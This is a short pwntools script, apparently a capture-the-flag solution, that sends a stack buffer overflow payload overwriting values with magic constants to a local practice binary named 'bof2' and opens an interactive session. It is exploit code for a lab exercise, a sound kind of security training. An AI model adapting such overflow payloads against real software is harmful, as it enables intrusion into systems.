from pwn import *

r = process('./bof2')

payload = b'a'*(0x30-0x20) + p64(0xcafebabe) + p64(0xdeadbeef) + p64(0x13371337)
r.sendafter(b'> ', payload)
r.interactive()